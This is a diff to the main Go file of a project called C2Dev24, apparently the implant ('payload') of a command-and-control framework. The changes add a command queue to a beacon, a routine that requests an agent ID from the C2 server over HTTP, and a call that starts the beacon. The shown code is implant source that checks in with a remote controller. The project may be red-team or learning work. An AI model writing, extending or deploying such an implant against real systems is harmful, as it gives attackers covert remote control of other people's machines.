@@ -1,17 +1,11 @@
-package payload
-
-import (
-	"C2Dev24/payload/internal"
-	"log"
-	"sync"
-)
-
 package main
 
 import (
-"github.com/coremedic/C2Dev24/payload/internal"
-"log"
-"sync"
+	"C2Dev24/payload/internal"
+	"fmt"
+	"io"
+	"log"
+	"sync"
 )
 
 var (
@@ -69,9 +63,38 @@ func main() {
 	instance.Beacon.Jitter = instance.Jitter
 	instance.Beacon.HttpConn = instance.HttpConn
 	instance.Beacon.ReqQueue = &internal.RequestQueue
+	instance.Beacon.CmdQueue = &internal.CommandQueue
 
-	// TODO: Fetch agent Id
+	// Fetch agent id from C2
+	id, err := getId(instance)
+	if err != nil {
+		log.Fatal(err)
+	}
+	instance.HttpConn.Id = *id
 
 	// Start the beacon
 	instance.Beacon.Start()
+}
+
+func getId(instance *Instance) (*string, error) {
+	idReq, err := instance.HttpConn.NewIdRequest()
+	if err != nil {
+		return nil, err
+	}
+
+	resp, err := instance.HttpConn.SendRequest(idReq)
+	if err != nil {
+		return nil, err
+	}
+
+	if resp.Body == nil {
+		return nil, fmt.Errorf("error getting id")
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	ret := string(body)
+	return &ret, nil
 }
